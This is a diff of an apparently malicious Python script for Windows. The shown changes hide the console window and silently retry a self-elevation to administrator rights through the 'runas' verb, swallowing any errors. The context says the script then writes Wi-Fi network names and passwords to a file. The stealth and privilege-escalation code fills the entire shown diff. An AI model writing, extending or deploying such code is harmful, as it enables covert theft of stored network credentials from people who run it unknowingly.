@@ -13,23 +13,24 @@ import sys
 import win32com.shell.shell as shell
 
 # Hide terminal
-kernel32 = ctypes.WinDLL('kernel32')
+kernel = ctypes.WinDLL('kernel32')
 
-user32 = ctypes.WinDLL('user32')
+user = ctypes.WinDLL('user32')
 
 SW_HIDE = 0
 
-hWnd = kernel32.GetConsoleWindow()
-user32.ShowWindow(hWnd, SW_HIDE)
+hWnd = kernel.GetConsoleWindow()
+user.ShowWindow(hWnd, SW_HIDE)
 
 # Admin access
 ASADMIN = 'asadmin'
-
-if sys.argv[-1] != ASADMIN:
-    script = os.path.abspath(sys.argv[0])
-    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
-    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
-
+try:
+    if sys.argv[-1] != ASADMIN:
+        script = os.path.abspath(sys.argv[0])
+        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+except:
+    pass
 
 # Opening a file for saving wifi names and passwords
 file_obj = open("wifi.txt", "w")
